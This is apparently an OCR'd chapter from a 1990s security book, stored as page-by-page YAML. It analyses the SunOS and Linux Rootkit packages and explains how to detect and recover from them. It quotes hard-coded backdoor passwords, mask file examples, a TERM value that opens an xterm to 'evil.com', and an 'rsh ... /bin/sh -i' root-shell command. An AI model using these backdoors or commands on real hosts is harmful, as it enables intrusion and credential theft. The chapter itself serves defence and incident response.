    and arguments. sudo v1.4 and later supports DU Enhanced Security without modification.


    wuarchive-ftpd is a replacement ftp server that provides more extensive logging
    of commands and file transfers than the stock ftp servers provided by UNIX vendors.


    wuarchive-ftpd v2.4 supports DU Enhanced Security, but only after applying a patch
    to the wuarchive-ftpd source before compiling the program. This patch is approximately
    150 lines and is available from ftp.mfi.com in /pub/sysadmin.


    # Summary


    Successfully implementing Enhanced Security requires a thorough knowledge of your
    environment and requirements, careful planning, and ongoing administrative responsibility,
    both in account management and general system maintenance. However, I have found
    the benefits of Enhanced Security, comprehensive auditing of security events,
    and more robust identification and authentication features far outweigh the disadvantages
    of the Enhanced Security system. What began as a way to comply with corporate
    security standards significantly enhanced my ability to manage my systems.


    # References


    DEC OSF/1 Security. Maynard, MA: Digital Equipment Corp.


    DEC OSF/1 System Administration. Maynard, MA: Digital Equipment Corp.'
  merge: -1
  img_proc: true
- pgno: 244
  md: '# Recognizing and Recovering from Rootkit Attacks


    # David O''Brien


    Installing Rootkit is one of the more popular activities of serious Internet intruders
    once they have obtained root privileges of a workstation running SunOS v4.x UNIX
    or the Slackware Linux distribution. Rootkit''s name suggests that it is a set
    of canned attack scripts for obtaining root access. However, Rootkit is really
    a collection of programs whose purpose is to allow an intruder to install and
    operate an Ethernet sniffer (a program that captures and decodes every packet
    on a network) on an unsuspecting SunOS v4.x or Solbourne host using /dev/nit or
    a Linux host using the eth0 interface. With this sniffer, an intruder can obtain
    the user IDs and passwords, including root, to your most sensitive networked systems.
    In this chapter, I will discuss the various strains of Rootkit that I analyzed,
    how to recognize and detect an attacked machine, and how to recover from the attack.'
  merge: -1
  img_proc: true
- pgno: 245
  md: '# The Threat


    I traced Rootkit’s lineage back to early 1994. Since then, it has been anonymously
    referred to in several CERT and CIAC advisories (CERT Advisory CA-94-01, “Ongoing
    Network Monitoring Attacks,” February 3, 1994; CERT Advisory CA-95-18 “Widespread
    Attacks on Internet Sites,” December 18, 1995; CIAC Advisory E-09: “Network Monitoring
    Attacks,” February 3, 1994; CIAC Advisory E-12: “Network Monitoring Attacks Update,”
    March 18, 1994) and even a popular newspaper (“Computer Outlaws Invade the Internet,”
    The Atlanta Journal-Constitution, May 24, 1994).


    Since its introduction into the intruder community, Rootkit has seen widespread
    use, and its threat should not be taken lightly. A 1994 CIAC bulletin (CIAC bulletin
    E-12: March 18, 1994) estimated that the number of accounts compromised worldwide
    exceeded 100,000. By 1996, this number is much, much greater. CERT and CIAC continue
    to issue periodic warnings about the popularity of sniffing user IDs and passwords.
    Network monitoring (sniffing) attacks represent a serious Internet threat.


    The typical Rootkit attack proceeds as follows. The intruders use a stolen or
    easily guessed password to log in to a host. They then gain unauthorized root
    access by exploiting known vulnerabilities in rdist, sendmail, /bin/mail, loadmodule,
    rpc.yppupdated, lpr, or passwd. The intruders ftp Rootkit to the host, unpack,
    compile, and install it; then they collect more username/password pairs and attack
    more hosts.


    In mid-1996, the only known variants of Rootkit ran on hosts running SunOS v4.x
    and the Linux Slackware distribution. However, the recipe for Rootkit is quite
    simple. The first ingredient is a sniffer program, which can be fashioned out
    of tcpdump or etherfind. This sniffer program, specializing in password recording,
    puts the Ethernet interface into promiscuous mode and allows the reading of every
    packet transmitted on an Ethernet network. The second ingredient is the source
    code to the standard system binaries. Thus, it is quite easy to write a version
    of Rootkit for other UNIX variants. I’ve already discovered a modified version
    of the SunOS Rootkit sniffer code for Solaris v2.x.


    Additionally, you should not assume that because you don’t have any workstations
    running SunOS v4.x or Linux your network is safe. Rootkit’s sniffer targets every
    telnet, rlogin, and ftp session regardless of system type, which includes all
    UNIX flavors, MS-DOS, VMS, and even MVS systems. This makes all your network systems
    vulnerable to attack — all it takes is one sniffer somewhere along the network
    path to your system.'
  merge: -1
  img_proc: true
- pgno: 246
  md: '# The Valuables Stolen


    Rootkit’s sniffer captures user IDs and passwords of accounts accessed over the
    network. Even though network sniffers have existed for some time in both hardware
    and software forms, their output is enormous and is not well formatted for obtaining
    user IDs and passwords. However, the output from Rootkit’s sniffer is very clear
    and concise, weeding out all the TCP packets that are not related to the authentication
    of telnet, rlogin, or ftp sessions. As shown in Figure 19.1, in which userid and
    password represent the actual data, the intruder can obtain the user IDs and passwords
    with ease. This information is logged to a file specified on the command line.
    The intruder then uses a back door to collect the log file.


    Given the sample output, it is easy to justify CIAC’s claim of more than 100,000
    compromised accounts worldwide. Rootkit attacks originate from many different
    countries. As a side note, telnet and ftp sessions originating from an attacked
    SunOS v4.x host are not sniffed, because packets going out from the host are not
    obtainable through /dev/nit.


    # Figure 19.1 Sample output from Rootkit’s sniffer.


    ```

    Using logical device ie0 [/dev/nit] Output to stdout.

    Log started at => Mon Nov 6 10:29:07 [pid 13146]

    - - TCP/IP LOG -- TM: Mon Nov 6 10:30:50 --

    PATH: distant.host.bar.edu(52864) => local.host.foo.edu(telnet)

    STAT: Mon Nov 6 10:52:07, 34 pkts, 73 bytes [TH_FIN]

    DATA: (255)(253)C(255)(251)(255)(250)X

    : VT100(255)(240)(255)(253)^A(255)(252)^Auser id

    : password

    - - TCP/IP LOG -- TM: Mon Nov 6 10:35:17

    PATH: distant2.bar.edu(52897) => local2.host.foo.edu(ftp)

    STAT: Mon Nov 6 10:58:17, 14 pkts, 62 bytes [TH_FIN]

    DATA: USER user id

    : : PASS password

    : :

    ```'
  merge: -1
  img_proc: true
- pgno: 247
  md: '# What Is Rootkit?


    Properly, Rootkit''s packing list includes the following items:


    +   - an Ethernet sniffer, specialized for logging passwords;

    +   - a Trojan login replacement with a back door;

    +   - support programs that are direct replacements for UNIX utilities (e.g.,
    `ps`, `netstat`, `ifconfig`) that could allow someone to detect the installed
    Ethernet sniffer; and

    +   - a utility for installing the Trojan system programs with the same dates,
    permissions, UID, GID, and checksum as the file being replaced.


    Some strains of Rootkit also include the following items:


    +   - replacement programs for `ls` and `du`;

    +   - replacements for `in.telnetd`; and

    +   - Trojan replacements for `chfn`, `csh`, `inetd`, `top`, `rshd`, and `syslogd`.


    # Rootkit Samples


    I''ve analyzed seven different SunOS Rootkit samples and three Linux Rootkit samples.
    The SunOS variants fall into two distinct strains, and the Linux variants all
    belong to a single strain.


    # SunOS Strains


    The two SunOS strains can be characterized by the secondary utilities included
    for stealth, "smartness" of the Trojan system programs, number of cracking tools
    supplied, and bug fixes. Version 1 strains are the oldest and come with more secondary
    programs to hide the intruder, such as `zap`, `ls`, and `du` Trojan replacements.
    Version 2 strains are derived from the older version 1 strains. Version 2 strains
    fixed a number of bugs in the modified SunOS source code and changed the makeup
    of the support programs. For some reason, the stealth versions of `ls` and `du`
    were removed. However, several cracking tools were added, as described in Table
    19.1.


    The sniffer is the `Esniff.c` program from `Phrack Magazine` [Vol. 5, Issue 45,
    File 5 of 28: March 30, 1994 (ISSN 1068-1035)]. The sniffing buffer varies from
    128 bytes to 1024 bytes. Various Rootkits call this `es`, `watch`, or `rpc.rarpd`.
    The `login`, `ps`, `netstat`, and `ifconfig` are hacked versions of Sun Microsystems''s
    proprietary SunOS v4.1.x source code. They all read mask files to specify which
    output to hide. Version 1 strains hardcode the filenames `/dev/ptyX`, where X
    is a single lowercase letter (with `p`, `q`, and `r` being the most popular).
    Typically, SunOS v4.x `pty` device files are of the form `ptyld`, `q`, `r` followed
    by a hexadecimal digit, so it is very easy'
  merge: -1
  img_proc: true
- pgno: 248
  md: 'not to notice these added files. In version 2 strains, the filenames are ns.f
    and ps.f in the data/ directory in which Rootkit is built. These mask files can
    be quite expressive. (See the sidebar "Mask File Formats" for examples.)


    The login Trojan allows anyone to log in as root across the network when supplying
    the magic password. The earliest versions hardcoded this password. I''ve seen
    D13hhf and fasune. Later versions query for the password when installing Rootkit.
    Regardless of the method used, the login Trojan binary does not contain the password
    in plain text form (it could be found with strings). When the password is hardcoded,
    it is hidden from strings'' view by assigning each letter to an element of a character
    array. When the password is picked during installation, the bitwise note of the
    password''s letters is stored in the binary. The Trojan login then decrypts the
    magic password at runtime. Some of the login Trojans also store username password
    pairs in a file for later collection.


    | Tool | Description |

    |------|-------------|

    | strobe | Julian Assange''s (AKA Proff) super-optimized TCP port surveyor. The
    official distribution is ftp://suburbia.apana.org.au/pub/users/proff/original/strobe.tgz.
    |

    | iss.sh | Christopher Klaus''s Internet Security Scanner v1.21. The official
    distribution is ftp://ftp.iss.net/pub/iss/iss21.shar. |

    | traceroute.c | Van Jacobson''s well-known traceroute program. The official distribution
    is in ftp://ftp.ee.lbl.gov/. |

    | nuke | A program to send an ICMP "host unreachable" packet to specified hosts.
    Posted periodically to the Usenet alt.2600 newsgroup. |

    | nfs shell | Leendert van Doom''s (leendert@cs.vu.nl) shell that provides access
    to NFS filesystems. |

    | ypx | Rob J. Nauta''s (rob@wzv.win.tue.nl) program to transfer NIS maps beyond
    a local network; posted to the Usenet alt.sources newsgroup. |

    | bootparam | A program that can be used to determine default routers and other
    information about boot servers (SunOS proprietary code). |'
  merge: -1
  img_proc: true
- pgno: 249
  md: 'The netstat Trojan hides network connections. With the network connections
    (e.g., telnet and ftp) hidden, the intruder is free to pick up the bounty of sniffed
    passwords or use your site as a springboard from which to attack other sites.


    The ifconfig Trojan hides the fact that your network interface is in promiscuous
    mode. There is no config file associated with the ifconfig Trojan.


    The ps Trojan hides running processes belonging to a specified UID, TTY, or program
    name. Many of the Trojans have an added "showall" option (-/) that ignores the
    contents of the mask file.


    # Mask File Formats


    # ps Mask File


    The following is an example /dev/ptyp mask file.


    ```

    0 0      # Strips all output with processes running under root

    1 p0     # Strips all output associated with tty typ0

    2 sniffer # Strips from output all programs with the name sniffer

    ```


    Only the first 125 characters in a line are significant. strtok(3) is used to
    parse a line of input, and no error checking is done on the format or number of
    fields. One result is that a blank line in the file will most probably cause a
    segmentation violation. Only the first two fields in a line are looked at; so,
    even though comments are not explicitly supported, they are benign. As shown above,
    there are three types of specifications. A specification other than 0, 1, or 2
    will be ignored. With specification 2, only the name of a program is checked,
    not options or arguments that would be seen with ps -w.


    # netstat Mask File


    The SunOS and Linux versions use slightly different encodings for masking actions.
    The following are examples for each type of /dev/ptypq mask file. (Note that foreign
    refers to connections from the local host out, and local refers to connections
    into the local host.)


    # SunOS Rootkit


    ```

    0 6667       # Strip all foreign irc network connections (port #)

    1 23         # Strip all local telnet connections (port #)

    2 192.88.209.5 # Strip all foreign connections from cert.org

    3 128.120.1.  # Strip all local connections to a ucd subnet

    ```'
  merge: -1
  img_proc: true
- pgno: 250
  md: 'Version 1 strains also include an ls and du Trojan pair to hide specified programs
    and directories from listings. It includes both native BSD and System V flavored
    versions, which are modified from the SunOS proprietary source code. Also included
    is zap, which zeroes out entries in utmp/wtmp/lastlog.


    One SunOS Rootkit sample also includes a Trojan /usr/etc/in.telnetd. If the value
    of the TERM environmental variable contains %, then the contents of TERM are tokenized
    into the UID, the program to exec(), and the process name ps listings. An example
    is vt100% /usr/openwin/bin/xterm -display evil.com% csh (csh).


    # Mask File Formats — continued


    # Linux Rootkit


    ```

    0 500          <- Hides all connections by uid 500

    1 128.31       <- Hides all local connections from 128.31.X.X

    2 128.31.39.20 <- Hides all remote connections to 128.31.39.20

    3 8000         <- Hides all local connections from port 8000

    4 6667         <- Hides all remote connections to port 6667

    5 .term/socket <- Hides all UNIX sockets including the path./term/socket

    ```


    The code to read in the file is the same as for ps, so the same limitations apply.
    As shown in the example mask files, there are multiple types of specifications.
    A specification other than those supported will be ignored. Not all versions support
    the mask file "override" option.


    # ls/du Mask File


    The following is an example /dev/ptyr mask file.


    ```

    sunsnif

    icmpfake

    ```


    Only the first 125 characters in a line are significant. There is no parsing of
    the specification line, and the entire line (up to 125 characters) is used. So,
    comments are not allowable in this file. The code assumes that there will be a
    terminating \n (i.e., the specification line was ≥124 characters), and it is blindly
    removed. Thus, if there were a filename >124 characters, it could not be masked.
    Only filenames may be specified; specifically, UIDs and GIDs cannot be specified.
    This is a plus for the good guys.


    # syslog Mask File


    This format applies to Linux only. The following is an example /dev/ptys mask
    file.


    ```

    evil.com

    123.100.101.202

    rshd

    ```'
  merge: -1
  img_proc: true
- pgno: 251
  md: '# Linux Strains


    The oldest Linux version of Rootkit that I''ve seen dates to October 11, 1994,
    and is incomplete. It includes only the login, ps, and netstat Trojans. The login
    Trojan magic password is whoot!. The netstat Trojan was enhanced with the ability
    to hide connections based on the UID and UNIX socket path.


    The next version, self-named "Linux Rootkit II version 1.0," released on April
    1, 1996, was totally rewritten and drew on the SunOS Rootkit for ideas and inspiration.
    This version contains the most coverage in terms of stealth. Linux Rootkit II
    version 1.1 quickly followed on April 20, 1996. It fixed some bugs and added a
    simpler sniffer that was better suited for background usage, a "bind a shell to
    a socket" utility, and utilities to remove (rather than zero out) utmp/wtmp/lastlog
    entries. The Linux Rootkit is now a very complete and dangerous package. Like
    the SunOS Rootkit strains, this version includes Trojan versions of chfn, chsh,
    inetd, top, rshd, and syslogd. Many of these Trojans recognize a magic password,
    the default is lrk r0x, and some recognize the special user rew t. Table 19.2
    contains a list of programs in the Linux Rootkit.


    # Detecting Rootkit


    Unless the intruder did a poor job of removing traces of his or her visit from
    the log files, attacks can be hard to detect. Most system administrators don''t
    know their site has been invaded until they are contacted by someone at another
    site or their disks begin filling up due to the sniffer''s logs. If you cannot
    explain disk usage, you should become alarmed, especially in light of the du and
    ls Trojans.


    Once you suspect a machine has been the victim of a Rootkit attack, you can do
    several things to verify this. The simplest is to try du, ls, ps, and netstat
    with the -/ option. If any of them accept this option, then Rootkit has been installed.
    Also, there is no short-circuiting in the mask list processing; even when you
    have a hit with a mask specification, the checking continues. So, a large specification
    list could conceivably cause a noticeable slowdown in the program. Text files
    found with file in /dev (especially with names of the form /dev/pty without device
    numbers) are also suspect.


    Another way to verify intrusion is to use system programs whose integrity is known.
    Putting original copies of ps, ls, du, lfconfig, and netstat on a write-protected
    floppy disk is a good idea. These may be used in situations in which the integrity
    of the system programs on the hard disk are questionable. There are also many
    second-party (i.e., nonstandard) utilities that may be used in these situations,
    as described in the following text.'
  merge: -1
  img_proc: true
- pgno: 252
  md: 'top(1) A system monitoring utility that combines the functionality of ps(1),
    uptime(1), renice(8), and kill(1). It can be found at ftp://eecs.nwu.edu/pub/top/
    and used to reliably check for the existence of rogue programs in the case of
    a SunOS host, since the SunOS version of Rootkit does not contain top(1).


    lsof List Open Files (ftp://vic.cc.purdue.edu/pub/tools/unix/lsof/) lists all
    open files, including open network sockets.


    # Table 19.2 The programs in the Linus Rootkit II v1.0.


    | Tool | Description |

    |------|-------------|

    | chfn | If you enter the magic password when prompted for your name, you will
    be dropped into a uid 0 /bin/sh shell, rather than being prompted for your password
    to commit any changes to your finger information. |

    | chsh | If you enter the magic password when prompted for your new shell, you
    will be dropped into a uid 0 /bin/sh shell. |

    | inetd | Runs /bin/sh -i as the server when you connect to the rfe service (Radio
    Free Ethernet). Many Linux distributions do not list this service in /etc/services,
    and it is not added by Rootkit''s installer. |

    | login | Allows root login with all logging turned off. There are two ways this
    is triggered: the magic user ID rewT, which allows root login even on unsecured
    terminals and the user is never queried for a password; or any user ID with the
    magic password lrkroX. |

    | ls/du | These are the same as SunOS additions. Note, since Linux distributions
    are POSIX it would be extremely easy to allow regular expressions in the mask
    file by using fnmatch(), rather than strcmp() (GNU''s ls, which is used in Linux,
    already uses fnmatch). |

    | ifconfig | This is the same as the SunOS version. |

    | netstat | Added masking based on UID and UNIX socket path. netstat includes
    the "showall" (-a) option. |

    | passwd | If the Rootkit magic password is entered, rather than the user''s password,
    /bin/bash is run with UID, EUID, GID, and EGID set to 0. |

    | ps | This is the same as the SunOS version. |'
  merge: -1
  img_proc: true
- pgno: 253
  md: 'tcplist Lists all open network connections in a nice table, including protocol/port
    numbers, remote hostname, UID of the local server/client and remote user for remote
    sites running an ident server (ftp://ftp.cdf.toronto.edu/pub/tcplist).


    cpm May be used on SunOS and Solbourne hosts to determine whether the machine''s
    Ethernet interface is running in promiscuous mode (ftp://info.cert.org/pub/tools/cpm/cpm1.0.tar.Z).
    For checking file integrity, the cryptographic checksum program md5 should also
    be added to this arsenal.


    zap This may also be useful because it does not delete users from utmp/wtmp/lastlog
    files, but rather overwrites the entries with binary zeros. Such entries can be
    an indication that a host has been attacked.


    # Cleaning Up after a Rootkit Attack


    Once you discover a compromised host, you must determine the extent of the attack.
    You must presume that all network transactions from or to any host "visible" on
    the network for the duration of the compromise were monitored and that intruders
    potentially possess any or all of the information so exposed. You should perform
    recovery and prevent future attacks as described in the following text.


    Disconnect the host from the network or operate the system in single-user mode
    during the recovery. This will keep users and intruders from accessing the system.


    | Table 19.2 (continued) |

    |---|---|

    | Tool | Description |

    | top | This is the same as the Linux ps program. |

    | rshd | Runs commands as root via /bin/sh when the local user (relative to the
    rshd server) is the Rootkit magic password. For example, rsh -l lrk0x victim.org
    /bin/sh -i would give an interactive root shell. |

    | syslogd | Filters log messages containing the specified substrings (via a mask
    file). This can greatly reduce the amount of work the intruder needs to do to
    cover his or her tracks on subsequent visits. |

    | bindshell | Binds /bin/sh to a socket (defaults to port 31337) when you connect
    to the port (a terminating ; is required for commands). |'
  merge: -1
  img_proc: true
- pgno: 254
  md: 'Locating Trojan versions of the standard system programs can be difficult,
    and you should be cautious in doing so. The intruder may have installed other
    Trojan programs that were not part of Rootkit; therefore, no system utility should
    be trusted unless restored from distribution media or a floppy disk backup copy,
    as discussed previously. This especially refers to sum, cmp, and ls.


    I advise that an entire system install be performed from read-only distribution
    media. If this is not feasible, all system binaries should be compared using a
    known good copy of md5 against the read-only distribution media. Since Rootkit
    installs Trojan programs with the exact checksum and timestamp as the legitimate
    version, these attributes cannot be used to find Trojan programs. However, cryptographic
    checksums are nearly impossible to spoof. Therefore, md5 from a read-only floppy
    backup can be trusted to compare installed programs against the distribution media
    or known correct checksums. Refer to Appendix B of CIAC bulletin E-12 for an extensive
    list of cryptographic checksums for various SunOS versions. The "live filesystem"
    CD-ROMs that are popular with Linux distributions may also be used.


    Resist the temptation of restoring from backups, unless it is positively known
    the backups were made before the Trojans were installed. Otherwise there is too
    great a chance the backups contain the Trojan programs, rather than the legitimate
    ones.


    The only effective long-term solution to preventing and neutralizing Rootkit attacks
    is by using encryption at the protocol layer. IP spoofing notwithstanding, simply
    not transmitting reusable clear-text passwords on the network is probably sufficient.
    Packages to accomplish these goals include the connection encryption package ssh
    (ftp://ftp.cs.hut.fi/pub/ssh/) and the one-time password packages S/KEY (ftp://thumper.bellcore.com/pub/skey/)
    and OPIE (ftp://ftp.nrl.navy.mil/pub/security/opie/).


    There are several short-term solutions. Simple ones include disabling the C compiler
    on non-development machines. In fact, this is generally agreed to be beneficial
    on critical servers because it greatly reduces the number of vulnerabilities that
    may be exploited. Installing and running Tripwire (http://coast.cs.purdue.edu/pub/tools/unix/Tripwire/)
    correctly is an excellent line of defense. Another is removing the /dev/nit device
    on SunOS and Solbourne hosts. This can be accomplished by rebuilding the kernel
    after commenting out the following lines.


    ```

    # The following are for streams NIT support. NIT is used by etherfind,

    # traffic, rarpd, and nbdoot. As a rule of thumb, NIT is almost always

    # needed on a server and almost never needed on a diskless client.

    #pseudo-device snit        # streams NIT

    pseudo-device pf           # packet filter

    pseudo-device nbuf         # NIT buffering module

    ```


    See your System and Network Administration manual, "Reconfiguring the System Kernel"
    for details on how to rebuild a kernel.'
  merge: -1
  img_proc: true
